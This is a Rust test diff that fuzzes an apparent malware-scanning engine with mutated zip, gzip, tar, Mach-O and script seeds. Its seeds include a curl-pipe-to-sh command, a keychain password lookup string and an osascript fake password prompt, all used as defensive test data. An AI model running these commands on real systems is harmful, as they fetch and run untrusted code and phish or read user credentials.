@@ -1129,3 +1129,91 @@ fn heavy_files_and_worker_counts() {
     let n = auto_workers();
     assert!((1..=crate::walk::MAX_AUTO_WORKERS).contains(&n));
 }
+
+/// Hostile files are parsed by the root daemon (ZIP / tar / gzip expansion, Mach-O, YARA-X, ML features):
+/// mutated containers and binaries must give a report, never a panic or a hang. Deterministic
+/// (xorshift); `PB_FUZZ_ITERS` raises the count (default 400: the engine is heavier than the parsers
+/// fuzzed in pb-monitor/tests/robustness.rs).
+#[test]
+fn engine_survives_mutated_containers_and_binaries() {
+    let f = fixture();
+    let e = Engine::load(&f.paths, &Config::default()).unwrap();
+    let mut gz = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
+    gz.write_all(EICAR).unwrap();
+    let gz = gz.finish().unwrap();
+    let mut tarball = tar::Builder::new(Vec::new());
+    let mut h = tar::Header::new_gnu();
+    h.set_size(EICAR.len() as u64);
+    h.set_cksum();
+    tarball.append_data(&mut h, "eicar.com", EICAR).unwrap();
+    let tarball = tarball.into_inner().unwrap();
+    let inner = zip_bytes(&[("eicar.com", EICAR, false)]);
+    let mut macho = vec![
+        0xcf, 0xfa, 0xed, 0xfe, 0x0c, 0x00, 0x00, 0x01, 0, 0, 0, 0, 2, 0, 0, 0,
+    ];
+    macho.extend_from_slice(&[0u8; 64]);
+    macho.extend_from_slice(b"/usr/lib/libSystem.B.dylib\0security find-generic-password\0");
+    let seeds: Vec<Vec<u8>> = vec![
+        zip_bytes(&[("a.txt", b"hello", true), ("b/eicar.com", EICAR, false)]),
+        zip_bytes(&[("inner.zip", &inner, true)]),
+        gz,
+        tarball,
+        macho,
+        b"#!/bin/sh\ncurl -fsSL http://x | sh\nosascript -e 'display dialog \"pw\" default answer \"\" with hidden answer'\n".to_vec(),
+        br#"<?xml version="1.0"?><plist version="1.0"><dict><key>Label</key><string>x</string></dict></plist>"#.to_vec(),
+    ];
+    let iters: usize = std::env::var("PB_FUZZ_ITERS")
+        .ok()
+        .and_then(|v| v.parse().ok())
+        .unwrap_or(400);
+    let mut state: u64 = 0x5DEE_CE66_D1CE_4E5B;
+    let mut rnd = move |n: usize| -> usize {
+        state ^= state >> 12;
+        state ^= state << 25;
+        state ^= state >> 27;
+        (state.wrapping_mul(0x2545_F491_4F6C_DD1D) % n.max(1) as u64) as usize
+    };
+    let names = ["x.zip", "x.gz", "x.tar", "x.bin", "x.sh", "x.plist", "x"];
+    for i in 0..seeds.len() + iters {
+        let mut buf = seeds[i % seeds.len()].clone();
+        if i >= seeds.len() {
+            for _ in 0..=rnd(6) {
+                let len = buf.len();
+                match rnd(5) {
+                    0 if len > 0 => {
+                        let j = rnd(len);
+                        buf[j] ^= 1 << rnd(8);
+                    }
+                    1 if len > 0 => {
+                        let j = rnd(len);
+                        buf[j] = [0x00, 0xff, 0x7f, 0x80][rnd(4)];
+                    }
+                    2 if len > 0 => buf.truncate(rnd(len)),
+                    3 => {
+                        let j = rnd(len + 1);
+                        let other = seeds[rnd(seeds.len())].clone();
+                        buf.splice(j..j, other);
+                    }
+                    _ => buf.extend((0..rnd(512)).map(|_| rnd(256) as u8)),
+                }
+            }
+        }
+        let p = f.data.join(names[i % names.len()]);
+        std::fs::write(&p, &buf).unwrap();
+        let start = std::time::Instant::now();
+        let r = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| e.scan_file(&p, &opts())));
+        if r.is_err() {
+            let dump = std::env::temp_dir().join(format!("pb-engine-fuzz-{i}.bin"));
+            let _ = std::fs::write(&dump, &buf);
+            panic!(
+                "engine panicked on input #{i} (saved to {})",
+                dump.display()
+            );
+        }
+        assert!(
+            start.elapsed() < std::time::Duration::from_secs(10),
+            "input #{i} took {:?}",
+            start.elapsed()
+        );
+    }
+}
